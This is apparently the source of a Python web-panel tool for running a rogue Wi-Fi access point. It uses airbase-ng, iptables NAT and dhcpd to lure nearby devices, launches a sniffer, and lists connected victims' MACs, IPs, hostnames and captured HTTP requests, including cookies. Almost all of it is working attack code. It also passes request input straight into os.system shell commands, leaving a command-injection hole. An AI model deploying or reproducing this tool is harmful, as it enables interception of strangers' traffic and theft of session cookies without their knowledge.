#!/usr/bin/env python
# coding=utf-8
# code by 92ez.com

import subprocess
import datetime
import platform
import sqlite3
import hashlib
import psutil
import json
import time
import web
import sys
import os

DN = open(os.devnull, 'w')

urls = (
    "/", "dataCenter",
    "/manage", "dataCenter",
    "/sysinfo", "systemInfo",
    "/allinfo", "getLinuxInfo",
    "/getCurrent", "currentInfo",
    "/getInterface", "netIface",
    "/createAp", "createAP",
    "/cleanup", "cleanEnv",
    "/getusers", "getUsers",
    "/gethttp", "getHTTP",
    "/queryUser", "queryAllUsers",
    "/queryHttp", "queryReqlist"
)


render = web.template.render('templates',cache=False)


class index:
    def GET(self):
        return render.index()


class dataCenter:
    def GET(self):
        return render.data()


class systemInfo:
    def GET(self):
        return render.systeminfo()


class getLinuxInfo:
    def POST(self):
        hostname = platform.uname()[1]
        release = platform.uname()[2]
        version = platform.linux_distribution()
        machine = platform.uname()[4]
        processor = platform.architecture()[0]

        logiccore = psutil.cpu_count()
        phycore = psutil.cpu_count(logical=False)
        if phycore == None : phycore = 1
        phymem = round(psutil.virtual_memory()[0]/1024.0/1024.0, 2)
        starttime = datetime.datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S")
        disktotal = round(psutil.disk_usage('/')[0]/1024.0/1024.0/1024.0, 2)
        diskused = round(psutil.disk_usage('/')[1]/1024.0/1024.0/1024.0, 2)
        diskfree = round(psutil.disk_usage('/')[2]/1024.0/1024.0/1024.0, 2)

        thisPid = os.getpid()

        return json.dumps(
            {
                "code": 0,
                "system": {
                    "hostname": hostname,
                    "release": release,
                    "version": version,
                    "machine": machine,
                    "processor": processor,
                    "starttime": starttime
                },
                "hard": {
                    "logiccore": logiccore,
                    "phycore": phycore,
                    "phymem": phymem,
                    "disktotal": disktotal,
                    "diskused": diskused,
                    "diskfree": diskfree
                },
                "os": {
                    "thisPid": thisPid
                }
            }
        )


class currentInfo:
    def POST(self):
        cpuused = psutil.cpu_percent(interval=None, percpu=False)
        memused = psutil.virtual_memory()[2]
        diskused = psutil.disk_usage('/')[3]
        pidcount = len(psutil.pids())

        uptimeshell = subprocess.Popen(['uptime'], stderr=subprocess.PIPE,stdout=subprocess.PIPE)
        uptimeshell.wait()
        uptime = uptimeshell.communicate()

        return json.dumps(
            {
                "code": 0,
                "current": {
                    "cpuused": cpuused,
                    "memused": memused,
                    "diskused": diskused,
                    "pidcount": pidcount,
                    "uptime": uptime
                }
            }
        )


class netIface:
    def POST(self):

        iface_res = os.popen("ip link").read()
        interfaces = []
        macs = []
        for line in iface_res.split('\n'):
            if 'default' in line:
                interfaces.append(line.split()[1].split(':')[0])
            if "link/" in line:
                macs.append(line.split()[1])

        ips = []
        for thisIface in interfaces:
            tempres = os.popen("ifconfig " + thisIface).read()
            tempip = '无'
            for line in tempres.split('\n'):
                if "netmask" in line:
                    tempip = line.split()[1]
            ips.append(tempip)

        router = os.popen("/sbin/ip route").read()
        active = []
        for line in router.split('\n'):
            if 'default via' in line:
                line = line.split()
                active.append(line[4])

        istatus = []
        for iface in interfaces:
            tempstatus = ''
            if iface in active:
                tempstatus = "连接"
            elif 'mon' in iface:
                tempstatus = "监听"
            elif 'lo' in iface:
                tempstatus = "回环"
            elif 'at' in iface:
                tempstatus = "转发"
            else:
                tempstatus = "断开"

            istatus.append({"name": iface, "status": tempstatus, "mac": macs[interfaces.index(iface)], "ip": ips[interfaces.index(iface)]})

        wirelessiface = []
        proc = subprocess.Popen(['iwconfig'], stdout=subprocess.PIPE, stderr=DN)
        wiface = proc.communicate()[0].split('\n')
        for line in wiface:
            if "IEEE 8" in line:
                if 'mon' in line:
                    continue
                wirelessiface.append(line.split()[0])

        return json.dumps({"code": 0, "interfaces": istatus, "wireless": wirelessiface})


class createAP:
    def POST(self):
        key = web.input().get("key")
        ssid = web.input().get("ssid")
        inet = web.input().get("inet")
        ap = web.input().get("ap")
        channel = '6'

        # set iptables
        iptables(inet)
        # start monitor
        mon_iface = start_monitor(ap,channel)
        # start ap
        start_ap(mon_iface, channel, ssid, key, ap)
        # dhcpconf
        ipprefix = getIpfix(inet)
        dhcpconf = dhcp_conf(ipprefix)
        dhcp(dhcpconf, ipprefix)
        proc = subprocess.Popen(['python', sys.path[0] + '/sniffer.py'], stdout=DN, stderr=DN)
        return json.dumps({"code": 0})


class getUsers:
    def GET(self):
        return render.users()    


class getHTTP:
    def GET(self):
        return render.http()


class queryReqlist:
    def GET(self):
        httpList = []
        try:
            cx = sqlite3.connect(sys.path[0] + "/wifihttp.db")
            cu = cx.cursor() 
            cu.execute("select * from httprec order by createtime desc limit 30")
            rows = cu.fetchall()
            cu.close()
            cx.close()
            for r in rows:
                httpList.append({"id": r[0], "type": r[1],"uri":r[2],"ua":r[3],"host":r[4],"referer":r[5],"createtime":r[6],"cookie":r[7]})
            return json.dumps({"code":0,"rows":httpList})
        except Exception, e:
            killpid = os.system('fuser wifihttp.db').read().split(':')[1]
            os.system('kill '+killpid)


class cleanEnv:
    def POST(self):
        os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
        os.system('iptables -F')
        os.system('iptables -X')
        os.system('iptables -t nat -F')
        os.system('iptables -t nat -X')
        os.system('pkill airbase-ng')
        os.system('pkill dhcpd')
        rm_mon()
        time.sleep(2)
        return json.dumps({"code":0})


class queryAllUsers:
    def GET(self):
        usersList = []
        try:
            saveUsersToSqlite()
            cx = sqlite3.connect(sys.path[0]+"/wifihttp.db")
            cu = cx.cursor() 
            cu.execute("select * from users order by start desc")
            rows = cu.fetchall()
            cu.close()
            cx.close()
            for r in rows:
                usersList.append({"id":r[0],"start":r[1],"mac":r[2],"ip":r[3],"uid":r[4],"client":r[5],"createtime":r[6]})
            return json.dumps({"code":0,"rows":usersList})
        except Exception, e:
            killpid = os.system('fuser wifihttp.db').read().split(':')[1]
            os.system('kill '+killpid)


def saveUsersToSqlite():
    users = []
    proc = subprocess.Popen(['cat', '/var/lib/dhcp/dhcpd.leases'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    pks = proc.communicate()[0].split('}\n')
    if len(pks[-1]) == 0:
        pks.pop()
    for p in pks:
        hostname = ''
        ipaddress = ''
        start_utc = ''
        mac = ''
        uid = ''
        pline = p.split('\n')
        for line in pline:
            if "client-hostname" in line:
                hostname = line.split()[1].replace('"', '')[:-1]
            if "lease" in line and "{" in line:
                ipaddress = line.split()[1]
            if "starts" in line:
                start_utc = line.split()[2].replace('/', '-')+' '+line.split()[3][:-1]
            if "hardware" in line:
                mac = line.split()[2][:-1]
            if "uid" in line and "server-duid" not in line:
                uid = line.split()[1].replace('"', '')[:-1]
                
        if len(hostname) < 1:
            hostname = '---'
        if len(uid) < 1:
            uid = '---'
        m2 = hashlib.md5()   
        m2.update(start_utc+mac+uid)

        if len(mac) > 0:
            users.append((start_utc, mac, ipaddress, uid, hostname, m2.hexdigest()))

    for u in users:
        try:
            cx = sqlite3.connect(sys.path[0]+"/wifihttp.db")
            cu = cx.cursor() 
            cu.execute("select * from users where hash = '"+u[5]+"'")
            if not cu.fetchone():
                cu.execute("insert into users (start,mac,ip,uid,client,hash) values (?,?,?,?,?,?)", u)
                cx.commit()
            cu.close()
            cx.close()
        except Exception, e:
            killpid = os.system('fuser wifihttp.db').read().split(':')[1]
            os.system('kill ' + killpid)
            saveUsersToSqlite()


def getIpfix(inet_face):
    tempip = ''
    tempres = os.popen("ifconfig "+inet_face).read()
    for line in tempres.split('\n'):
        if "netmask" in line:
            tempip = line.split()[1][:2]
    return tempip


def iptables(inet_iface):
    os.system('iptables -X')
    os.system('iptables -F')
    os.system('iptables -t nat -F')
    os.system('iptables -t nat -X')
    os.system('iptables -t nat -A POSTROUTING -o %s -j MASQUERADE' % inet_iface)
    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')


def start_monitor(ap_iface, channel):
    proc = subprocess.Popen(['airmon-ng', 'start', ap_iface, channel], stdout=subprocess.PIPE, stderr=DN)
    proc_lines = proc.communicate()[0].split('\n')

    for line in proc_lines:
        if "monitor mode vif enabled" in line:
            line = line.split()
            mon_iface = line[6].split(']')[1]
            return mon_iface


def dhcp_conf(ipprefix):
    config = ('default-lease-time 300;\n'
              'max-lease-time 360;\n'
              'ddns-update-style none;\n'
              'authoritative;\n'
              'log-facility local7;\n'
              'subnet %s netmask 255.255.255.0 {\n'
              'range %s;\n'
              'option routers %s;\n'
              'option domain-name-servers %s;\n'
              '}')
    if ipprefix == '19' or ipprefix == '17':
        with open('/tmp/dhcpd.conf', 'w') as dhcpconf:
            dhcpconf.write(config % ('10.0.0.0', '10.0.0.2 10.0.0.100', '10.0.0.1', '114.114.114.114'))
    elif ipprefix == '10':
        with open('/tmp/dhcpd.conf', 'w') as dhcpconf:
            dhcpconf.write(config % ('172.16.0.0', '172.16.0.2 172.16.0.100', '172.16.0.1', '114.114.114.114'))
    return '/tmp/dhcpd.conf'


def start_ap(mon_iface, channel, essid, key, ap):
    print '[*] Starting the fake access point...'
    print '[*] Waiting for 6 seconds...'
    try:
        if len(key) < 1:
            subprocess.Popen(['airbase-ng', '-P', '-c', channel, '-e', essid, mon_iface], stdout=DN, stderr=DN)
        else:
            subprocess.Popen(['airbase-ng', '-P', '-c', channel, '-e', essid, '-w', key, mon_iface], stdout=DN, stderr=DN)
        time.sleep(6)
        print '[*] '+essid+' set up on channel '+channel+' via '+mon_iface+' on '+ap + ' key is '+key
        subprocess.Popen(['ifconfig', 'at0', 'up', '10.0.0.1', 'netmask', '255.255.255.0'], stdout=DN, stderr=DN)
        subprocess.Popen(['ifconfig', 'at0', 'mtu', '1400'], stdout=DN, stderr=DN)
    except Exception,e:
        print e


def dhcp(dhcpconf, ipprefix):
    os.system('echo > /var/lib/dhcp/dhcpd.leases')
    dhcp = subprocess.Popen(['dhcpd', '-cf', dhcpconf], stdout=subprocess.PIPE, stderr=DN)
    if ipprefix == '19' or ipprefix == '17':
        os.system('route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1')
    else:
        os.system('route add -net 172.16.0.0 netmask 255.255.255.0 gw 172.16.0.1')


def rm_mon():
    monitors = []
    proc = subprocess.Popen(['iwconfig'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    for line in proc.communicate()[0].split('\n'):
        if len(line) == 0: continue
        if line[0] != ' ':
            iface = line[:line.find(' ')]
            if 'Mode:Monitor' in line:
                monitors.append(iface)

    for m in monitors:
        if 'mon' in m:
            subprocess.Popen(['airmon-ng', 'stop', m], stdout=DN, stderr=DN)
        else:
            subprocess.Popen(['ifconfig', m, 'down'], stdout=DN, stderr=DN)
            subprocess.Popen(['iw', 'dev', m, 'mode', 'managed'], stdout=DN, stderr=DN)
            subprocess.Popen(['ifconfig', m, 'up'], stdout=DN, stderr=DN)

if __name__ == "__main__":

    print '-'*24
    print '|      by 92ez.com     |'
    print '-'*24

    if os.geteuid() != 0:
        sys.exit('[Error!!!] You must run this script as root')

    app = web.application(urls, globals())
    app.run()
